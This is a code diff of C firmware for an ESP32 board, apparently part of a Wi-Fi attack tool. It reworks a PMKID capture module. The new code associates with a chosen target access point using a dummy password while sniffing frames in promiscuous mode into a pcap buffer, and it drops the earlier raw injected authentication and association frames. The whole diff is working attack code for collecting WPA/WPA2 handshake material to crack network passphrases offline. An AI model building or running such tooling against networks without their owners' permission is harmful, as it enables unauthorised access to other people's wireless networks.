@@ -1,4 +1,5 @@
 #include "wifi_pmkid.h"
+#include "wifi_manager.h"
 #include "esp_log.h"
 #include "esp_wifi.h"
 #include "freertos/FreeRTOS.h"
@@ -70,68 +71,16 @@ static bool pcap_append(const uint8_t *frame, uint16_t frame_len,
     return true;
 }
 
-static size_t build_auth(uint8_t *frame, const uint8_t ap[6], const uint8_t sta[6])
+static void association_task(void *arg)
 {
-    memset(frame, 0, 30);
-    frame[0] = 0xB0;
-    memcpy(frame + 4, ap, 6);
-    memcpy(frame + 10, sta, 6);
-    memcpy(frame + 16, ap, 6);
-    frame[26] = 1;
-    return 30;
-}
-
-static size_t build_assoc(uint8_t *frame, const uint8_t ap[6], const uint8_t sta[6],
-                          const char *ssid)
-{
-    size_t pos = 0;
-    memset(frame, 0, 128);
-    memcpy(frame + 4, ap, 6);
-    memcpy(frame + 10, sta, 6);
-    memcpy(frame + 16, ap, 6);
-    pos = 24;
-    frame[pos++] = 0x11;
-    frame[pos++] = 0x04;
-    frame[pos++] = 0x0A;
-    frame[pos++] = 0x00;
-
-    size_t ssid_len = strnlen(ssid, 32);
-    frame[pos++] = 0;
-    frame[pos++] = (uint8_t)ssid_len;
-    memcpy(&frame[pos], ssid, ssid_len);
-    pos += ssid_len;
-
-    static const uint8_t rates[] = { 1, 8, 0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24 };
-    memcpy(&frame[pos], rates, sizeof(rates));
-    pos += sizeof(rates);
-
-    static const uint8_t rsn[] = {
-        0x30, 0x14, 0x01, 0x00,
-        0x00, 0x0F, 0xAC, 0x04,
-        0x01, 0x00,
-        0x00, 0x0F, 0xAC, 0x04,
-        0x01, 0x00,
-        0x00, 0x0F, 0xAC, 0x02,
-        0x00, 0x00,
-    };
-    memcpy(&frame[pos], rsn, sizeof(rsn));
-    pos += sizeof(rsn);
-    return pos;
-}
-
-static void tx_task(void *arg)
-{
-    uint8_t frame[128];
-    uint8_t sta[6];
-    esp_wifi_get_mac(WIFI_IF_STA, sta);
-    if (s_running) {
-        size_t n = build_auth(frame, s_target, sta);
-        esp_wifi_80211_tx(WIFI_IF_STA, frame, n, false);
-    }
-    vTaskDelay(pdMS_TO_TICKS(200));
-    if (s_running) {
-        size_t n = build_assoc(frame, s_target, sta, s_ssid);
-        esp_wifi_80211_tx(WIFI_IF_STA, frame, n, false);
+    (void)arg;
+    esp_err_t err = esp_wifi_connect();
+    if (err != ESP_OK) {
+        ESP_LOGW(TAG, "association failed: %s", esp_err_to_name(err));
+        s_state = PMKID_FAILED;
+        s_running = false;
+        esp_wifi_set_promiscuous_rx_cb(NULL);
+        esp_wifi_set_promiscuous(false);
     }
     s_tx_task = NULL;
     vTaskDelete(NULL);
@@ -230,8 +179,24 @@ esp_err_t wifi_pmkid_start(const uint8_t bssid[6], uint8_t channel,
     err = esp_wifi_set_promiscuous_rx_cb(promisc_rx);
     if (err != ESP_OK) goto fail;
 
+    wifi_config_t config = {0};
+    strncpy((char *)config.sta.ssid, s_ssid, sizeof(config.sta.ssid) - 1);
+    memcpy(config.sta.bssid, s_target, 6);
+    config.sta.bssid_set = true;
+    config.sta.channel = channel;
+    config.sta.threshold.authmode = WIFI_AUTH_WPA_WPA2_PSK;
+    config.sta.pmf_cfg.capable = true;
+    config.sta.pmf_cfg.required = false;
+    strncpy((char *)config.sta.password, "pmkid_probe", sizeof(config.sta.password) - 1);
+    err = esp_wifi_set_mode(WIFI_MODE_STA);
+    if (err != ESP_OK) goto fail;
+    err = esp_wifi_set_storage(WIFI_STORAGE_RAM);
+    if (err != ESP_OK) goto fail;
+    err = esp_wifi_set_config(WIFI_IF_STA, &config);
+    if (err != ESP_OK) goto fail;
+
     s_running = true;
-    if (xTaskCreate(tx_task, "pmkid_tx", 3072, NULL, 6, &s_tx_task) != pdPASS) {
+    if (xTaskCreate(association_task, "pmkid_assoc", 3072, NULL, 6, &s_tx_task) != pdPASS) {
         err = ESP_ERR_NO_MEM;
         goto fail;
     }
@@ -239,7 +204,7 @@ esp_err_t wifi_pmkid_start(const uint8_t bssid[6], uint8_t channel,
 
 fail:
     s_running = false;
-    s_state = PMKID_IDLE;
+    s_state = PMKID_FAILED;
     esp_wifi_set_promiscuous_rx_cb(NULL);
     esp_wifi_set_promiscuous(false);
     return err;
@@ -251,6 +216,7 @@ void wifi_pmkid_stop(void)
     esp_wifi_set_promiscuous_rx_cb(NULL);
     esp_wifi_set_promiscuous(false);
     esp_wifi_set_mode(WIFI_MODE_STA);
+    wifi_mgr_disconnect();
     if (s_state == PMKID_CAPTURING) s_state = PMKID_IDLE;
 }
 
